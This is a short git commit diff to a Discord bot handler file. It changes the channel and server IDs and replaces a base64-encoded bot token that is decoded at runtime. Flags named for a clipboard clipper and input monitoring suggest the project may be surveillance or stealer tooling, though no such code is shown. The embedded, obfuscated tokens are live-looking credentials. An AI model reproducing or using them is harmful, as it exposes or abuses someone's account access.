455e6786092a8f8b009e83502832762383b1c915
pillowlibrary <thenamesethan.yt@gmail.com>
2024-11-07 19:45:57 -0800

    Update discord_handler.py

--- functions/discord_handler.py
+++ functions/discord_handler.py
@@ -9,10 +9,10 @@ from functions.help import setup_help_command
 clipper_active = False
 input_monitor_active = False
 
-CHANNEL_ID = 1293132121547735147  # Replace with your actual channel ID
-SERVER_ID = 1293132121547735144   # Replace with your actual server ID
+CHANNEL_ID = 1304289454575452173 # Replace with your actual channel ID
+SERVER_ID = 1304289454575452170   # Replace with your actual server ID
 
-encoded_token = "TVRJM09EWTFNalEzTkRNM01EQXpNVFl4TncuR2E2anNxLk1fb2FWdFlKWmRrNVFIUmlkUm5XTmlHTktXRnlfM2VvWWZaTGUw"
+encoded_token = "TVRNd05ESTVNREE1T0RVeE9EVTFOalkzTWcuR1JXaVFyLkk5UmdnZVpvOW95aUEteWVzSFlJSFB5SzY3a3hJZFpmbGxoV2N3"
 
 # Decode the token at runtime
 DISCORD_TOKEN = base64.b64decode(encoded_token).decode('utf-8')
